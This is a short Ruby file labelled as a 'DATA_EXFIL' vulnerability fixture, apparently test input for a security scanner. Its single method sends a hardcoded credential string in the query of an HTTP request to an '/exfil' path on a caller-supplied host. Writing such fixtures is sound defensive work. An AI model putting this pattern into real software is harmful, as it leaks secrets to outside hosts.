# Phase 11 (Track J.9) — Ruby DATA_EXFIL vuln fixture.
require 'net/http'
require 'uri'

def run(host)
  secret = "alice-creds"
  uri = URI("http://#{host}/exfil?token=#{secret}")
  Net::HTTP.get(uri)
end
